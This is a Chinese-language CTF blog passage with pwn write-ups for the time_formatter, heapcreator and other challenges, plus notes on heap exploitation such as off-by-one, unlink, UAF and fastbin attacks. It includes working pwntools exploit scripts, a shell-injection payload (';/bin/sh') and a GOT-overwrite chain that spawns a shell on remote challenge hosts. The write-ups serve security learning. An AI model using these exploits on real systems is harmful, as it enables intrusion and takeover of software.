<span class="keyword">unsigned</span> __int64 v20; <span class="comment">// [rsp+2D8h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">  v20 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_E60((<span class="keyword">char</span> *)&amp;dest);                       <span class="comment">// 填充v14和v15</span></span><br><span class="line">  v11 = <span class="number">0LL</span>;</span><br><span class="line">  lineptr = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( getline(&amp;lineptr, (<span class="keyword">size_t</span> *)&amp;v11, <span class="built_in">stdin</span>) == <span class="number">-1</span> )<span class="comment">// 输入，没有限制，回车结束</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  v3 = <span class="built_in">strrchr</span>(lineptr, <span class="string">&#x27;\n&#x27;</span>);                  <span class="comment">// 输入判空</span></span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  *v3 = <span class="number">0</span>;</span><br><span class="line">  v4 = &amp;v16;</span><br><span class="line">  v5 = &amp;v17;</span><br><span class="line">  <span class="built_in">strcpy</span>((<span class="keyword">char</span> *)&amp;dest, lineptr);               <span class="comment">// 辨识度极高的vul_func</span></span><br><span class="line">  sha256_func((__int64)&amp;dest, &amp;v16, <span class="number">0x100</span>u);    <span class="comment">// v16==sha变换后的dest（0x100）</span></span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v6 = (<span class="keyword">unsigned</span> __int8)*v4;</span><br><span class="line">    v7 = v5;</span><br><span class="line">    v5 += <span class="number">2</span>;</span><br><span class="line">    ++v4;</span><br><span class="line">    <span class="built_in">snprintf</span>(v7, <span class="number">3uLL</span>, <span class="string">&quot;%02x&quot;</span>, v6);             <span class="comment">// 最终目的：把v17填充为hex的v16</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v5 != &amp;v18 );</span><br><span class="line">  v8 = <span class="built_in">strcmp</span>(&amp;v15, &amp;v17);                      <span class="comment">// 比较v15和v17，如果不同就报错</span></span><br><span class="line">  <span class="keyword">if</span> ( v8 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;wrong password!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v9 = popen(&amp;v14, <span class="string">&quot;r&quot;</span>);                        <span class="comment">// 把命令传到binsh执行</span></span><br><span class="line">  <span class="keyword">if</span> ( !v9 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span> ( fgets(&amp;s, <span class="number">256</span>, v9) )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, &amp;s);</span><br><span class="line">  fclose(v9);</span><br><span class="line">  <span class="keyword">return</span> v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>剩下两个子函数不表，功能写在注释里了程序很简短，其中可以马上注意到很熟悉的危险函数strcpy()，再一看发现两个不是很熟悉的函数：getline和popen</p>
<ul>
<li>getline(char **lineptr, size_t *n, FILE *stream):将输入的字符串放入lineptr指向的空间，（如果为NULL则由系统malloc），n:如果是malloc出的则为0，stream：终止符（？）<br>
输入结束的方式为1. 读取字符数达到n，2.遇到函数终止符（\n），3.断开输入</li>
</ul>
<p>可以看到，这里的getline也是一个没有限制输入的危险函数</p>
<ul>
<li>popen：将命令传入/bin/sh中由shell执行，分为输入和输出(w和r)</li>
</ul>
<p>所以我们要做的就是让popen执行get flag 的命令。<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20201213144954.png" alt="20201213144954"><br>
那么首先就要满足这个条件。再一看，发现v17的来源是(hex)v16，v16是经过sha256变换的des。所以想get shell只需要v15==v16<br>
一看栈中变量的分布，发现它们都可以被覆盖呀！！！</p>
<p>所以exp就出来了：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">p = remote(<span class="string">&quot;220.249.52.134&quot;</span>, <span class="number">52529</span>)</span><br><span class="line"></span><br><span class="line">v15 = hashlib.sha256(<span class="string">&quot;a&quot;</span>*<span class="number">0x100</span>).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="comment">#p1 = &quot;a&quot;*0x100 + &quot;ls;&quot;.ljust(0x1b, ) + v15 </span></span><br><span class="line">p1 = <span class="string">&quot;a&quot;</span>*<span class="number">0x100</span> + <span class="string">&quot;cat flag.txt;&quot;</span>.ljust(<span class="number">0x1b</span>, ) + v15</span><br><span class="line"><span class="comment">#dest + cmd + sha256</span></span><br><span class="line"></span><br><span class="line">p.sendline(p1)</span><br><span class="line"><span class="built_in">print</span> p.recv()</span><br></pre></td></tr></table></figure>
<p>分两次进行，一次查看目录下的文件，第二次打开.txt文件</p>
<p>over</p>
<h2 id="time-formatter">time_formatter</h2>
<p>接触到的第一个堆漏洞题</p>
<p>首先checksec：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pluto@pluto-virtual-machine:~/Desktop$ checksec 5</span><br><span class="line">[*] <span class="string">&#x27;/home/pluto/Desktop/5&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>
<blockquote>
<p>（开启了FORTIFY_SOURCE对格式化字符串有两个影响：<br>
1.包含%n的格式化字符串不能位于程序内存中的可写地址。<br>
2.当使用位置参数时，必须使用范围内的所有参数。所以如果要使用%7$x，你必须同时使用1,2,3,4,5和6。）</p>
</blockquote>
<p>运行程序&amp;ida-f5：<br>
主函数是一个选择菜单，修改函数名后如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">      <span class="keyword">switch</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)menu(v4) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">          v5 = set_time_format(v4, <span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">          v5 = set_time(v4, <span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">          v5 = set_time_zone();</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">          v5 = print_time(v4, <span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5u</span>:</span><br><span class="line">          v5 = exit_program(v4, <span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//其中1和3两个选项对应的函数用到了动态分配的内存，函数2把输入的值放到了bss段</span></span><br><span class="line"><span class="comment">//不同的是函数1对输入进行了判断，函数2没有判断：</span></span><br><span class="line"></span><br><span class="line"><span class="function">_BOOL8 __fastcall <span class="title">sub_400CB5</span><span class="params">(<span class="keyword">char</span> *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> accept; <span class="comment">// [rsp+5h] [rbp-43h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+38h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(&amp;accept, <span class="string">&quot;%aAbBcCdDeFgGhHIjklmNnNpPrRsStTuUVwWxXyYzZ:-_/0^# &quot;</span>);</span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strspn</span>(s, &amp;accept) == <span class="built_in">strlen</span>(s);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//目前还不知道这个判断有什么作用</span></span><br></pre></td></tr></table></figure>
<p>继续往函数4和5看下去</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">print_time</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> command; <span class="comment">// [rsp+8h] [rbp-810h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+808h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    __snprintf_chk(&amp;command, <span class="number">2048LL</span>, <span class="number">1LL</span>, <span class="number">2048LL</span>, <span class="string">&quot;/bin/date -d @%d +&#x27;%s&#x27;&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)dword_602120, ptr, a3);</span><br><span class="line">    __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Your formatted time is: &quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="keyword">if</span> ( getenv(<span class="string">&quot;DEBUG&quot;</span>) )</span><br><span class="line">      __fprintf_chk(<span class="built_in">stderr</span>, <span class="number">1LL</span>, <span class="string">&quot;Running command: %s\n&quot;</span>, &amp;command);</span><br><span class="line">    setenv(<span class="string">&quot;TZ&quot;</span>, value, <span class="number">1</span>);</span><br><span class="line">    system(&amp;command);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You haven&#x27;t specified a format!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">`/bin/date -d @%d +&#x27;%s&#x27;`是一个shell注入。</span></span><br><span class="line"><span class="comment">在命令行中，多个命令可以用分号隔开，执行时会依次运行。我们需要把它构造成：“/bin/data -d @0 + &quot;;/bin/sh&quot;”</span></span><br><span class="line"><span class="comment">但是由于传入的format在输入时就被限制了，所以不能直接通过format就让它执行我们想要的操作</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">signed</span> __int64 <span class="title">exit_program</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+8h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  free_0(ptr);</span><br><span class="line">  free_0(value);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Are you sure you want to exit (y/N)? &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  fgets(&amp;s, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  result = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (s &amp; <span class="number">0xDF</span>) == <span class="number">89</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;OK, exiting.&quot;</span>);</span><br><span class="line">    result = <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//这里，如果执行到函数5，会先释放format和time_zone的内存，然后再询问是否退出。</span></span><br><span class="line"><span class="comment">//但并没有在free之后立刻改变指针指向的位置，造成了uaf漏洞</span></span><br></pre></td></tr></table></figure>
<p>所以大概的思路就有了：</p>
<ol>
<li>先产生一个存放format的空间然后释放，释放后指针F依旧指向这块内存，这块小空间被放在fastbin的头部，下一次分配内存时如果大小合适将首先将它分配出去</li>
<li>进入函数3，输入payload，此时payload将放入原先放置format空间</li>
<li>进入函数4，执行system(“/bin/sh”)，getshell</li>
</ol>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;220.249.52.133&quot;</span>, <span class="number">32519</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./5&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> p.recv()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mass</span>(<span class="params">ch,data</span>):</span></span><br><span class="line">	p.sendline(ch)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(data)&gt;<span class="number">0</span>:</span><br><span class="line">		p.sendline(data)</span><br><span class="line"></span><br><span class="line">mass(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">mass(<span class="string">&quot;5&quot;</span>,<span class="string">&quot;N&quot;</span>)</span><br><span class="line">mass(<span class="string">&quot;3&quot;</span>,<span class="string">&#x27;\&#x27;;/bin/sh\&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">mass(<span class="string">&quot;4&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>ctfwiki堆漏洞整理</title>
    <url>/29281.html</url>
    <content><![CDATA[<p>不出意外的话我应该是把这个鸽掉了</p>
<!---more

# 堆溢出

向某个堆块写入的字节数超过了可用字节数（堆管理器会对用户申请的字节数进行调整，可用字节数可能大于申请的字节数），数据溢出到下一个（物理相邻的高地址）堆块上

<span id="more"></span>
<p><strong>利用策略</strong>：</p>
<ul>
<li>1.覆盖下一个chunk的内容</li>
<li>2.利用堆中的机制如unlink，实现任意地址写入或者控制堆块中的内容</li>
</ul>
<h2 id="几个重要步骤">几个重要步骤</h2>
<ol>
<li>寻找堆分配函数：malloc、calloc、realloc（根据参数size的不同，实现分配和释放的功能）<br>
malloc不能初始化分配的空间，可能遗留上一次释放前的数据；calloc会把分配空间的每一位都初始化为空</li>
<li>寻找危险函数（输入输出、字符串操作）</li>
<li>确定填充长度（注意对齐以及可能借用下一chunk的pre_size）</li>
</ol>
<h2 id="Off-By-One-堆">Off-By-One(堆)</h2>
<p>指溢出了一个字节（单字节缓冲区溢出）</p>
<h3 id="利用思路">利用思路</h3>
<ol>
<li>修改堆大小使堆块结构出现重叠，泄露其他数据或者覆盖其他数据</li>
<li>使prev_in_use位清零，这时前块会被认为是空闲的
<ol>
<li>unlink</li>
<li>伪造prev_size造成堆块之间的重叠（前提是unlink的时候没有检查按prev_size找到的块和prev_size大小是否一致</li>
</ol>
</li>
</ol>
<h3 id="b00k">b00k</h3>
<p>然后运行一下看看程序的运行，再进ida，函数名已经把功能写的很清楚了：<br>
main函数：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309165145.png" alt="20210309165145"></p>
<p>发现每次读入都是调用这个函数：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309165416.png" alt="20210309165416"><br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309165312.png" alt="20210309165312"><br>
而仔细想想这个函数，发现当长度为32时，刚好能把结束符覆盖到下一个字节，而程序刚开始运行输入的author_name存储的位置也真的是非常的巧妙：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309165850.png" alt="20210309165850"><br>
也就是说我们能够泄露出book信息存放的地址了</p>
<h1>Chunk extend &amp; overlapping</h1>
<p>主要是通过其他漏洞（如off by one）修改某个chunk的size，达到覆盖后面几个chunk的效果，这样就能直接修改后面chunk的内容，造成任意地址读、控制执行等</p>
<h2 id="heapcreator">heapcreator</h2>
<p>照例先check一波</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">pluto@pluto-virtual-machine:~/Desktop$ checksec heapcreator </span><br><span class="line">[*] <span class="string">&#x27;/home/pluto/Desktop/heapcreator&#x27;</span></span><br><span class="line">    Arch:     amd64-<span class="number">64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x400000</span>)</span><br></pre></td></tr></table></figure>
<p>main函数：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309170512.png" alt="20210309170512"><br>
create():<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309170921.png" alt="20210309170921"><br>
进入create，先为heaparry中一个成员申请出一块空间，再让这块空间中的第二个位置（*((void **)heaparray[i] + 1)）指向content的内容</p>
<p>用gdb先分配一下，create两次，大小为2，内容分别为aa和bb，可以看到分配了四个堆：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309184045.png" alt="20210309184045"></p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309184657.png" alt="20210309184657"><br>
这里回顾一下chunk的结构：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309184724.png" alt="20210309184724"><br>
pre_size这个字段（8字节）在p==1即前一个chunk在使用时是提供给前一个chunk使用的<br>
至于为什么分配的大小都是0x21，是因为分配的时候会将申请的大小转换为实际分配的大小，64位下要是16的整数倍，0x21/16==2</p>
<p>edit函数，19行明显可以造成溢出<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309185720.png" alt="20210309185720"><br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309185824.png" alt="20210309185824"></p>
<p>剩下两个函数都是没啥大问题的</p>
<p>于是可以想到，构造三个chunk，然后通过第一个chunk改变第二个chunk的大小使得2、3chunk overlapping；<br>
free chunk2，然后再次分配改变第三个chunk的大小和内容，使其指向free.got，接着调用show()把free的地址打印出来；<br>
这时因为目标是调用system(“/bin/sh”)所以还需要劫持free的got表，而<strong>由于此时chunk2的ptr已经修改为free_got了，编辑chunk2就相当于改free_got了</strong>；<br>
于是最后一步就只需要再造一个chunk，写入’/bin/sh’然后释放，就能达到getshell的目的</p>
<p>关于加粗部分：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309193527.png" alt="20210309193527"></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./heapcreator&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./heapcreator&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size, payload</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Size of Heap : &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Content of heap:&quot;</span>,<span class="built_in">str</span>(payload))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params"><span class="built_in">id</span>, payload</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Content of heap : &quot;</span>,<span class="built_in">str</span>(payload))</span><br><span class="line">	p.recvline()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="string">&quot;4&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x18</span>,<span class="string">&quot;aaaa&quot;</span>)	</span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">&quot;bbbb&quot;</span>)</span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">&quot;cccc&quot;</span>)</span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x18</span> + <span class="string">&#x27;\x81&#x27;</span>)</span><br><span class="line">sleep(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x40</span> + <span class="string">&#x27;\x08&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>) + p64(elf.got[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line">create(<span class="number">0x70</span>,payload)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Content : &quot;</span>)</span><br><span class="line">free_addr = u64(p.recvuntil(<span class="string">&quot;Done&quot;</span>)[:-<span class="number">5</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(free_addr)</span><br><span class="line">free_sys_offset = -<span class="number">0x3f1a0</span></span><br><span class="line">sys_addr = free_addr + free_sys_offset</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;\nsys_addr:   &#x27;</span> + <span class="built_in">hex</span>(sys_addr)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,p64(sys_addr)) </span><br><span class="line">gdb.attach(p)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1>Unlink</h1>
<p>对于两个释放了的物理相邻的chunk，在内存回收进行合并时会加入新的bin，此时有可能产生攻击点</p>
<p>unlink的过程：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309195222.png" alt="20210309195222"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当我们 free() 时</span><br><span class="line">glibc 判断这个块是 small chunk</span><br><span class="line">判断前向合并，发现前一个 chunk 处于使用状态，不需要前向合并</span><br><span class="line">判断后向合并，发现后一个 chunk 处于空闲状态，需要合并</span><br><span class="line">继而对 Nextchunk 采取 unlink 操作</span><br><span class="line"></span><br><span class="line">unlink 具体执行的效果:</span><br><span class="line">FD=P-&gt;fd = target addr -12</span><br><span class="line">BK=P-&gt;bk = expect value</span><br><span class="line">FD-&gt;bk = BK，即 *(target addr-12+12)=BK=expect value</span><br><span class="line">BK-&gt;fd = FD，即 *(expect value +8) = FD = target addr-12</span><br></pre></td></tr></table></figure>
<h1>UAF</h1>
<p>主要有这两种情况：</p>
<ul>
<li>内存块被释放后，其对应的指针没有被设置为 NULL，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序很有可能可以正常运转。</li>
<li>内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，就很有可能会出现奇怪的问题。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">释放后没有被置为NULL的指针称为dangling pointer（悬空指针）</span><br><span class="line">没有初始化的指针称为wild pointer（野指针）</span><br></pre></td></tr></table></figure>
<p>关注到free后没有把指针指向NULL的代码片段</p>
<h2 id="hacknote">hacknote</h2>
<p>据说是很经典的UAF入门题。网上关于这个题的分析有很多了，但还有一些点是自己看了别人的wp然后想了好久才理解到的，就记录一下一些点。</p>
<p>第一次add两个node时：<br>
notelist数组中的值：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20201218132834.png" alt="20201218132834"></p>
<p>notelist[i]指向的chunk中的内容，其中0x0804865b是print_note_content函数的地址：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20201218133230.png" alt="20201218133230"></p>
<p>删除两个node后：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20201218133934.png" alt="20201218133934"><br>
可以看到chunk里的内容改变了，但是notelist数组的前两个值依然指向原来的chunk<br>
（这里free的顺序出了点小问题）</p>
<p>再次add一个大小为8的node时：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20201218134358.png" alt="20201218134358"><br>
发现原来的两个chunk分配给了新生成的node，。<br>
因为上面free的顺序反了导致notelist[0]和[2]指向了相同的位置，本可以把第一个chunk的内容覆盖为system的gadget，不过…意思到了就行。</p>
<p>如果覆盖为system(…)即程序提供的magic函数，就可以print_nodelist[0],调用magic函数，获得shell</p>
<p>over！</p>
<h1>FASTBIN有关的漏洞</h1>
<ol>
<li>fastbin double free</li>
<li>house of spirit</li>
<li>alloc to stack</li>
<li>arbitrary alloc</li>
</ol>
<p>前两种主要侧重利用free函数释放真的或者伪造的chunk，然后再申请chunk进行攻击；后两种侧重于修改fd指针，利用malloc申请执行位置的chunk<br>
原理在于，fastbin由单链表维护，并且fastbin中的chunk即使释放了，next_chunk的pre_inuse位也不会清空</p>
<h2 id="lctf2016-pwn200">lctf2016-pwn200</h2>
<p>首先依旧是：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210316212059.png" alt="20210316212059"><br>
发现什么保护都没有开，（这就使得这个题有两种做法…）<br>
再用ROPgadget搜索，没有看到system和/bin/sh</p>
<p>用ida打开，先看一波main_2函数：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210316212316.png" alt="20210316212316"><br>
其中第一个漏洞点就是在输入 “who am i” 的时候，当输入长度为48的时候，最后一位（本应该是结束符\0）会变成有效的字符，与后续的rbp相连，在下一句printf会将rbp打印出来<br>
该函数的倒数第二句，在ida的伪c代码中，input返回后没有赋给任何变量，但实际上看汇编代码会发现：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210316213816.png" alt="20210316213816"><br>
刚好紧挨在“whoami”的上边</p>
<p>再看main_2的返回函数<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210316214104.png" alt="20210316214104"><br>
程序唯一的两个出现malloc的函数之一。<br>
这个函数主要是分配一个固定大小的区域，然后将输入的buf复制到区块中，再把地址赋给ptr，ptr存在bss段中（0x0602098）。<br>
strcpy有多危险就不用说了，其次，buf的长度为0x38，读入的长度却是0x40，可以把dest覆盖掉：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210316215426.png" alt="20210316215426"></p>
<p>随后的loo函数就是一个选择菜单功能，其中有checkin和checkout。checkout函数在检查指针存在性后，把ptr的堆块释放，并把指针置为0。<br>
checkout函数如下：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210316215654.png" alt="20210316215654"><br>
把输入的“long”当作malloc的大小，malloc出的地址赋给ptr，然后再把&quot;money&quot;直接放入新建立的chunk中。</p>
<h3 id="HOS">HOS</h3>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210315165708.png" alt="20210315165708"><br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210315165656.png" alt="20210315165656"></p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210315222308.png" alt="20210315222308"></p>
<p>大致的思路就是：</p>
<ul>
<li>在第一次输入money（存入buf）时构造出一个chunk（方法是覆盖dest），指向输入的这个栈，此时这个区域在计算机的角度就成了一个chunk。</li>
<li>将这个堆释放再分配，这个区域就变得可控，可以一直控制到返回地址</li>
<li>因为这些函数是一个调用一个的，所以choose 3，结束了最顶层的函数，就可以返回执行shellcode</li>
</ul>
<p>其中exp（下）中传入的id==0x61，意思是伪造fake_chunk的下一个chunk（物理相连）的size。</p>
